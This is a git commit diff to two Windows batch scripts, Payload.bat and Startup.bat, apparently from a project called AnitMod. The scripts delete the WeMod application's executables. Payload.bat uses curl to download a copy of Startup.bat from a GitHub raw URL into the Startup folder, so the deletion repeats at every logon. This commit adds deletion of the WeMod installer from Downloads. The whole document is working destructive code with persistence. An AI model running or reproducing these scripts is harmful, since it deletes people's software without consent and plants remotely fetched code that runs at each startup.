6742f12bed3393f6b571813e4b76a789463fe84f
DrMeepso <50252724+DrMeepso@users.noreply.github.com>
2021-11-08 14:26:38 +1300

    7

--- Payload.bat
+++ Payload.bat
@@ -3,5 +3,6 @@ rem CD to wemod Location
 rem taskkill /IM WeMod.exe /F > nul
 del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
 del C:\Users\%username%\AppData\Local\WeMod\Update.exe
+del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
--- Startup.bat
+++ Startup.bat
@@ -1,4 +1,5 @@
 del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
 del C:\Users\%username%\AppData\Local\WeMod\Update.exe
+del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
 
 exit
